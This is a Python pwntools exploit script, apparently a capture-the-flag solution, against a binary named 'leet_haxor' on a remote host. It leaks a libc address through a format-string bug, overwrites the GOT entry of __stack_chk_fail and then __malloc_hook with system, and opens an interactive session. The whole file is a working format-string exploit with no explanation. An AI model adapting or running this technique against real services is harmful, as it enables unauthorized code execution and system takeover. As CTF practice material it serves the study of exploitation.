from pwn import *

#p = process("./leet_haxor")

p = remote("jh2i.com", 50022)

context.clear(arch="amd64")

def l33tify(x):
	p.sendlineafter("exit\n", "0")
	p.sendline(x)

elf = ELF("leet_haxor")
libc = elf.libc

payload = fmtstr_payload(18, {elf.got['__stack_chk_fail']: elf.symbols['main']})
pause()
l33tify(b"%26$p")
p.recvline()
leak = int(p.recvline(), 16)
log.info("Leaked:    %s" %hex(leak))
libc.address = leak - 0x4019a0
log.info("LIBC:       %s" %(hex(libc.address)))

payload = fmtstr_payload(18, {libc.symbols['__malloc_hook']: libc.symbols['system']}, write_size='byte')
l33tify(payload)
p.interactive()